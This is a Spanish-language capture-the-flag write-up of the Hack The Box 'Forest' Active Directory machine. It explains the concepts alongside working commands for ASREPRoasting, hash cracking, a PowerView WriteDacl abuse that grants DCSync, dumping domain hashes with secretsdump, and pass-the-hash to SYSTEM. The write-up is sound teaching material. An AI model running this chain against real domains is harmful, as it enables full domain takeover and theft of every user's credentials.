# Forest — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Forest](https://app.hackthebox.com/machines/Forest) |
| **Plataforma** | [Hack The Box](https://hackthebox.com/) |
| **Sistema Operativo** | Windows Server 2016 (Active Directory) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Antes de empezar: cómo pensar en Active Directory

Antes de entrar en materia, una idea que ayuda mucho a que AD "encaje" mentalmente: **Active Directory no es una lista plana de usuarios y contraseñas, es un grafo de relaciones de confianza y permisos**. Un usuario pertenece a grupos, esos grupos tienen permisos sobre otros objetos (otros grupos, cuentas de equipo, el propio dominio...), y esos permisos se pueden encadenar. Comprometer AD casi nunca es "una vulnerabilidad = shell de root"; es encontrar un **camino** (un *attack path*) desde una cuenta de bajo privilegio hasta Domain Admin, saltando de objeto en objeto a través de esas relaciones. Esta máquina es un ejemplo perfecto de ese patrón, y por eso herramientas como **BloodHound** son tan importantes: convierten AD en un grafo visual navegable en lugar de una lista de comandos sueltos.

La cadena completa de Forest es:

1. Enumerar usuarios del dominio de forma anónima (sin credenciales).
2. Encontrar una cuenta vulnerable a **ASREPRoasting** y robar su hash.
3. Crackear el hash offline para obtener una contraseña en texto claro.
4. Entrar por WinRM con esa cuenta → **user flag**.
5. Usar **BloodHound** para mapear qué puede hacer esa cuenta dentro del grafo de AD.
6. Descubrir que, por pertenencia a grupos anidados, la cuenta puede crear usuarios y modificar permisos de un grupo con derechos elevados sobre el dominio.
7. Abusar de esos permisos para concederse a uno mismo (a un usuario nuevo) el derecho de **DCSync**.
8. Usar DCSync para volcar **todos los hashes del dominio**, incluido el de Administrator.
9. **Pass-the-Hash** contra el DC → SYSTEM → **root flag**.

---

## Reconocimiento

### Enumeración de puertos

```bash
nmap -p- -sCV -T5 10.129.45.187 -oN nmap
```

![Nmap Scan](images/forest_01_nmap.JPG)

Servicios relevantes encontrados:

| Puerto | Servicio | Detalle |
|---|---|---|
| 53/tcp | domain | Simple DNS Plus |
| 88/tcp | kerberos-sec | Microsoft Windows Kerberos |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 389/tcp | ldap | AD LDAP (dominio: `htb.local`) |
| 445/tcp | microsoft-ds | Windows Server 2016 SMB |
| 464/tcp | kpasswd5 | Kerberos password change |
| 593/tcp | ncacn_http | RPC over HTTP |
| 636/tcp | ldapssl | LDAPS |
| 3268/tcp | ldap | Global Catalog |
| 3269/tcp | ldapssl | Global Catalog (SSL) |
| 5985/tcp | http | WinRM |
| 9389/tcp | mc-nmf | .NET Message Framing (AD Web Services) |
| 47001/tcp | http | WinRM (listener adicional) |
| 49xxx/tcp | msrpc | Puertos RPC dinámicos |

De nuevo la huella típica de un **Domain Controller** (DNS + Kerberos + LDAP + SMB), y de nuevo WinRM (5985) disponible para cuando consigamos credenciales. El propio Nmap, gracias a los scripts `smb-os-discovery` y `smb2-time`, ya nos regala información valiosa sin necesidad de autenticarnos:

```
Computer name: FOREST
Domain name: htb.local
Forest name: htb.local
FQDN: FOREST.htb.local
```

> **Nota:** aquí "Forest" tiene doble sentido: es el nombre de la máquina, pero también es un término real de AD. Un **forest (bosque)** es el contenedor de más alto nivel en Active Directory: puede agrupar varios **dominios** que confían entre sí. En este laboratorio el bosque tiene un único dominio, `htb.local`.

Añadimos el dominio al `/etc/hosts`:

![Fichero hosts](images/forest_02_hosts.JPG)

---

## Enumeración LDAP anónima

**LDAP** (Lightweight Directory Access Protocol, puerto 389) es el protocolo que usa Active Directory para almacenar y consultar todos sus objetos: usuarios, grupos, equipos, políticas... Es literalmente la base de datos del dominio expuesta en red.

Muchos entornos (y por defecto en versiones antiguas de Windows Server) permiten un **bind anónimo**: conectarse a LDAP sin ningún usuario ni contraseña y aun así poder listar objetos del directorio. Es el equivalente, en el mundo AD, a lo que era la "sesión nula" de SMB en la máquina Cicada: un fallo de configuración que expone información sin necesidad de credenciales.

Se comprueba si el bind anónimo funciona:

```bash
ldapsearch -x -H ldap://10.129.45.187:389 -b "dc=htb,dc=local"
```

![LDAP bind anónimo](images/forest_03_ldapsearch_anon.JPG)

El servidor responde sin pedir credenciales, confirmando que el bind anónimo está permitido. `-b "dc=htb,dc=local"` indica el **base DN** (Distinguished Name) desde el que empezar a buscar — es la forma en que LDAP representa "el dominio htb.local" como ruta jerárquica.

---

## Enumeración de usuarios con windapsearch

`ldapsearch` en crudo es potente pero incómodo de leer. Se usa **windapsearch**, una herramienta en Python pensada específicamente para consultas LDAP contra Active Directory, que formatea la salida de forma mucho más legible.

```bash
git clone https://github.com/ropnop/windapsearch.git
cd windapsearch
```

![Clonando windapsearch](images/forest_04_git_clone_windapsearch.JPG)

Con el bind anónimo confirmado, se enumeran todos los usuarios del dominio:

```bash
./windapsearch.py -d htb.local --dc-ip 10.129.45.187 -U
```

![Enumeración de usuarios (parte 1)](images/forest_05_windapsearch_users_p1.JPG)
![Enumeración de usuarios (parte 2)](images/forest_05b_windapsearch_users_p2.JPG)

Se listan **28 usuarios**. La mayoría son buzones de sistema de Exchange (`SystemMailbox{...}`, `HealthMailbox...`) generados automáticamente al instalar Microsoft Exchange, pero entre ellos aparecen varias **cuentas de persona reales**:

```
sebastien, lucinda, andy, mark, santi
```

Y, relevante para el siguiente paso, existe también una cuenta de servicio: **`svc-alfresco`**. Las cuentas `svc-*` son típicamente cuentas de servicio (usadas por aplicaciones, no por personas) y suelen tener configuraciones más laxas — un objetivo habitual en AD.

Adicionalmente, se lanza una consulta genérica para confirmar el alcance de lo que el bind anónimo permite leer:

```bash
./windapsearch.py -d htb.local --dc-ip 10.129.45.187 --custom "objectClass=*"
```

![Consulta LDAP genérica](images/forest_06_windapsearch_custom.JPG)

---

## ASREPRoasting

Este es el paso central de la fase de acceso inicial, y uno de los conceptos de AD que más cuesta interiorizar la primera vez, así que vamos despacio.

### ¿Cómo funciona Kerberos (resumen mínimo)?

Cuando un usuario quiere autenticarse en un dominio con Kerberos, normalmente:

1. El cliente envía al KDC (Key Distribution Center, un rol que corre en el DC) una petición **AS-REQ** (Authentication Service Request) que incluye un **timestamp cifrado con el hash de la contraseña del usuario** (esto se llama *pre-autenticación*, o *pre-auth*). Es una prueba de "conozco la contraseña" sin enviarla en claro.
2. El KDC descifra ese timestamp usando el hash que él mismo tiene almacenado para ese usuario. Si coincide y el timestamp es reciente, confirma la identidad y responde con un **AS-REP** (Authentication Service Reply) que contiene un **TGT** (Ticket Granting Ticket) cifrado con el hash del `krbtgt`, la cuenta especial que firma todos los tickets del dominio.

### El fallo: `UF_DONT_REQUIRE_PREAUTH`

Algunas cuentas tienen deshabilitado el requisito de pre-autenticación (un flag en AD llamado `DONT_REQ_PREAUTH`). Esto significa que **cualquiera puede pedir un AS-REP para esa cuenta sin demostrar que conoce su contraseña**. El KDC, sin comprobar nada, responde igualmente con una porción del AS-REP **cifrada con el hash de la contraseña del usuario objetivo**.

Esa parte cifrada se puede descargar y, como no depende de ninguna sesión de red posterior, se puede **crackear offline**, probando contraseñas hasta que una de ellas descifre correctamente ese bloque. A esto se le llama **ASREPRoasting**, y es exactamente análogo en espíritu al Kerberoasting (que ataca tickets de servicio, TGS) pero apuntando al AS-REP inicial.

### Ejecutando el ataque

Con la lista de usuarios obtenida antes, se prueba contra `svc-alfresco`:

```bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.45.187 -no-pass
```

![GetNPUsers — ASREPRoasting](images/forest_07_getnpusers_asreproast.JPG)

`-no-pass` es la clave: no se aporta ninguna contraseña, y aun así el KDC responde con el hash porque `svc-alfresco` tiene la pre-autenticación deshabilitada. Se obtiene un hash con formato `$krb5asrep$23$svc-alfresco@HTB.LOCAL:...`.

Se guarda en un fichero para poder crackearlo:

![Hash guardado](images/forest_08_hash_saved.JPG)

### Crackeo offline con John the Ripper

```bash
john hashPsswd --fork=4 --wordlist=/home/kali/Escritorio/rockyou.txt
```

![John the Ripper — crackeo](images/forest_09_john_crack.JPG)

El hash cede rápido contra el diccionario `rockyou.txt`:

```
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

Credencial obtenida: **svc-alfresco : s3rvice**

---

## Acceso Inicial — WinRM

```bash
evil-winrm -i 10.129.45.187 -u svc-alfresco -p s3rvice
```

![Evil-WinRM + user flag](images/forest_10_evilwinrm_svcalfresco_userflag.JPG)

Shell obtenida como `svc-alfresco`. Se navega al escritorio y se lee `user.txt`.

**🚩 User flag capturada.**

---

## Mapeo del dominio con BloodHound

Ya dentro, el reto es: *¿qué puede hacer `svc-alfresco` dentro de este dominio, y hasta dónde puede llegar?* Responder a esto a mano (revisando membresías de grupo, ACLs de cada objeto...) sería tedioso y propenso a errores. Para esto existe **BloodHound**.

### ¿Qué es BloodHound?

BloodHound modela Active Directory como un **grafo dirigido**: cada objeto (usuario, grupo, equipo, OU...) es un **nodo**, y cada relación entre ellos (pertenencia a grupo, permisos de un objeto sobre otro, sesiones activas, etc.) es una **arista (edge)** con un tipo concreto (`MemberOf`, `GenericAll`, `WriteDacl`, `AddKeyCredentialLink`...). Una vez cargado el grafo, se puede preguntar cosas como *"¿existe algún camino desde este usuario hasta Domain Admins?"* y la herramienta lo calcula automáticamente, algo prácticamente imposible de hacer a ojo en un dominio real con miles de objetos.

### Recolectando datos con SharpHound

**SharpHound** es el "recolector" — el ejecutable que corre dentro del dominio, consulta LDAP y SMB para extraer toda esta información, y la empaqueta en un ZIP con JSON que luego se importa en la aplicación gráfica de BloodHound (que corre en la máquina atacante).

```powershell
upload SharpHound.exe
.\SharpHound.exe -c All
download 20260814052012_BloodHound.zip
```

![SharpHound — recolección y descarga](images/forest_11_sharphound.JPG)

`-c All` indica recolectar **todos** los tipos de datos disponibles (sesiones, ACLs, membresías de grupo, relaciones de confianza, etc.), para tener el grafo más completo posible.

### Analizando el grafo: cadena de membresías

El ZIP se importa en BloodHound y se busca el nodo `SVC-ALFRESCO@HTB.LOCAL` para ver sus relaciones directas:

![Cadena MemberOf de svc-alfresco](images/forest_12_bloodhound_memberof.JPG)

Se observa la siguiente cadena de pertenencia a grupos (recordar: **la pertenencia a grupos en AD es transitiva/anidada** — si el grupo A es miembro del grupo B, todos los miembros de A heredan también lo que tenga B):

```
svc-alfresco
  └─ MemberOf → Service Accounts
        └─ MemberOf → Privileged IT Accounts
              └─ MemberOf → Account Operators
```

**`Account Operators`** es un grupo integrado (built-in) de Windows con un privilegio importante: sus miembros pueden **crear, modificar y eliminar cuentas de usuario y de grupo** en el dominio (con algunas excepciones, como los grupos administrativos protegidos). Es un privilegio pensado originalmente para delegar tareas administrativas básicas sin dar Domain Admin — pero, como vamos a ver, mal combinado con otros permisos se convierte en una vía directa a comprometer el dominio entero.

### Buscando el camino hasta Domain Admins

Con la función **Pathfinding** de BloodHound, se pide el camino más corto entre `SVC-ALFRESCO@HTB.LOCAL` y `DOMAIN ADMINS@HTB.LOCAL`:

![Pathfinding hacia Domain Admins](images/forest_13_bloodhound_pathfinding_da.JPG)

El grafo revela dos caminos posibles, ambos partiendo de `Account Operators`:

```
Account Operators
   ├─ GenericAll → Exchange Windows Permissions
   │                        └─ WriteDacl → HTB.LOCAL (el dominio)
   │                                            └─ Contains → Domain Admins
   │
   ├─ GenericAll → Enterprise Key Admins  ─ AddKeyCredentialLink → FOREST.HTB.LOCAL (el DC)
   │                                                                      └─ HasSession → Administrator → MemberOf → Domain Admins
   │
   └─ GenericAll → Key Admins ─ AddKeyCredentialLink → FOREST.HTB.LOCAL (mismo camino que arriba)
```

Traduciendo cada tipo de arista:

- **`GenericAll`**: control total sobre el objeto. Si `Account Operators` tiene `GenericAll` sobre el grupo `Exchange Windows Permissions`, cualquier miembro de `Account Operators` puede **añadir miembros a ese grupo** (entre otras cosas).
- **`WriteDacl`**: permiso para **modificar la DACL** (la lista de control de acceso) de un objeto — es decir, para **conceder nuevos permisos** sobre ese objeto a quien uno quiera. `Exchange Windows Permissions` tiene `WriteDacl` sobre el propio objeto del dominio `HTB.LOCAL`. Este es un fallo de configuración real y conocido: al instalar Microsoft Exchange, el instalador crea este grupo y le otorga `WriteDacl` a nivel de dominio para poder gestionar ciertos objetos — un exceso de privilegio muy documentado en el mundo real.
- **`AddKeyCredentialLink`**: permite vincular una "credencial de clave" (certificado/clave pública) a un objeto, lo que habilita el llamado ataque de **Shadow Credentials** — otra vía para tomar el control de una cuenta sin conocer su contraseña, añadiendo un método de autenticación alternativo.

Es decir: **`svc-alfresco`, por pura herencia de grupos anidados, termina teniendo el poder de reescribir los permisos del dominio entero.**

---

## Explotación de la cadena de privilegios

### 1. Crear una cuenta nueva (privilegio de Account Operators)

Como miembro (indirecto) de `Account Operators`, `svc-alfresco` puede crear una cuenta de usuario nueva en el dominio:

```powershell
net user jujogova !23jjgv /add /domain
```

Y añadirla a los dos grupos que hacen falta para el resto del plan:

```powershell
net group "Exchange Windows Permissions" jujogova /add
net localgroup "Remote Management Users" jujogova /add
```

![Creación de usuario y asignación de grupos](images/forest_14_net_user_create_groups.JPG)

- Se añade a **`Exchange Windows Permissions`** porque es el grupo que tiene `WriteDacl` sobre el dominio (el permiso que vamos a explotar).
- Se añade a **`Remote Management Users`** por un motivo puramente práctico: ese grupo es el que autoriza a un usuario a conectarse por **WinRM**. Sin esto, la cuenta nueva no podría usarse para obtener una shell remota más adelante.

### 2. Abusar de WriteDacl para concederse DCSync (PowerView)

Ya con `jujogova` en `Exchange Windows Permissions`, se tiene `WriteDacl` sobre el dominio. Se usa **PowerView** (una librería de PowerShell para atacar AD, parte del framework Empire) para añadir una nueva entrada a la DACL del dominio que otorgue a `jujogova` los derechos necesarios para hacer **DCSync**.

Primero se sube la herramienta:

```powershell
upload powerview.ps1
```

![Subida de PowerView](images/forest_15_upload_powerview.JPG)

Y se ejecuta el ataque:

```powershell
. .\powerview.ps1
$pass = convertto-securestring '!23jjgv' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\jujogova', $pass)
Add-ObjectACL -PrincipalIdentity jujogova -Credential $cred -Rights DCSync
```

![PowerView — concesión de derechos DCSync](images/forest_16_powerview_dcsync_acl.JPG)

`Add-ObjectACL ... -Rights DCSync` añade al dominio dos **extended rights** de AD sobre la cuenta `jujogova`:

- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

### ¿Qué es exactamente DCSync?

Estos dos derechos son, en circunstancias normales, exclusivos de los **Domain Controllers** (y de Domain Admins/Enterprise Admins). Le dicen al dominio: *"esta cuenta tiene permiso para pedir que se le repliquen cambios del directorio, igual que haría otro DC"*. Es decir, con estos derechos se puede **hacerse pasar por un controlador de dominio** y pedirle al DC real que "replique" (envíe) los datos del directorio — incluidos los **hashes de contraseñas de todos los usuarios del dominio**, sin necesidad de tocar el fichero `NTDS.dit` directamente ni volcar memoria de `lsass.exe`. Esta técnica se llama **DCSync**, y es una de las formas más limpias y sigilosas de comprometer un dominio entero una vez se tienen los permisos adecuados.

### 3. Ejecutando el DCSync

```bash
impacket-secretsdump htb/jujogova@10.129.45.187
```

![Secretsdump — volcado NTDS vía DCSync](images/forest_17_secretsdump_ntds.JPG)

`secretsdump` habla el protocolo **MS-DRSR** (Directory Replication Service Remote Protocol) con el DC, solicitando la replicación de credenciales tal como haría otro controlador de dominio legítimo. El resultado es el volcado completo de `NTDS.dit` (la base de datos de AD que contiene, entre otras cosas, todos los hashes de contraseñas del dominio):

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

Se obtiene el **hash NTLM de `Administrator`**, la cuenta con más privilegios del dominio.

---

## Escalada de Privilegios — Pass-the-Hash con psexec

Con el hash de Administrator, se autentica directamente sin necesidad de crackearlo, usando **Pass-the-Hash**:

```bash
impacket-psexec administrator@10.129.45.187 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

![Impacket-psexec — shell SYSTEM](images/forest_18_psexec_administrator_root.JPG)

`psexec` (a diferencia de WinRM) sube un servicio temporal al `ADMIN$` de la máquina víctima y lo ejecuta a través del **Service Control Manager**, lo que da como resultado una shell con privilegios de **`nt authority\system`** — un nivel por encima incluso de Administrator, ya que SYSTEM es la identidad que usa el propio sistema operativo.

```
C:\Windows\system32> whoami
nt authority\system
```

Se navega al escritorio de Administrator y se lee la flag final:

```
C:\Users\Administrator\Desktop> type root.txt
```

**🚩 Root flag capturada.**

---

## Resumen de la cadena de ataque

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan | `nmap` |
| Enumeración LDAP | Bind anónimo | `ldapsearch` |
| Enumeración de usuarios | Consulta LDAP anónima | `windapsearch` |
| Credencial inicial | ASREPRoasting (`DONT_REQ_PREAUTH`) | `impacket-GetNPUsers` |
| Cracking offline | Ataque de diccionario contra AS-REP | `john` + `rockyou.txt` |
| Acceso inicial | WinRM | `evil-winrm` |
| Mapeo de AD | Recolección + análisis de grafo | `SharpHound` + `BloodHound` |
| Abuso de privilegios | Creación de cuenta (Account Operators) | `net user` / `net group` |
| Escalada de privilegios | Abuso de `WriteDacl` → concesión de DCSync | `PowerView` |
| Extracción de credenciales | DCSync (MS-DRSR) | `impacket-secretsdump` |
| Escalada final | Pass-the-Hash | `impacket-psexec` |

---

## Conceptos clave para recordar

- **Bind anónimo LDAP**: igual que una sesión nula en SMB, pero para el directorio de AD. Permite enumerar usuarios sin credenciales si el DC está mal configurado.
- **ASREPRoasting**: ataca cuentas con la pre-autenticación Kerberos deshabilitada; no requiere ninguna credencial previa, solo conocer el nombre de usuario.
- **Membresía de grupos anidada**: en AD los permisos "viajan" a través de cadenas de grupos. Hay que pensar siempre en cadenas completas, no en membresías directas.
- **BloodHound**: convierte la pregunta "¿puedo llegar a Domain Admin?" en un problema de caminos en un grafo, en vez de una revisión manual objeto por objeto.
- **`GenericAll` / `WriteDacl`**: derechos de control sobre objetos de AD que, bien encadenados, permiten escalar privilegios sin explotar ningún fallo de software — solo configuraciones erróneas de permisos.
- **DCSync**: con los derechos de replicación adecuados, cualquier cuenta puede "hacerse pasar" por un Domain Controller y obtener todos los hashes del dominio.
- **Pass-the-Hash**: el hash NTLM es, a efectos prácticos, tan válido como la contraseña para autenticarse — no hace falta crackearlo si solo se necesita autenticación, no la contraseña en texto claro.
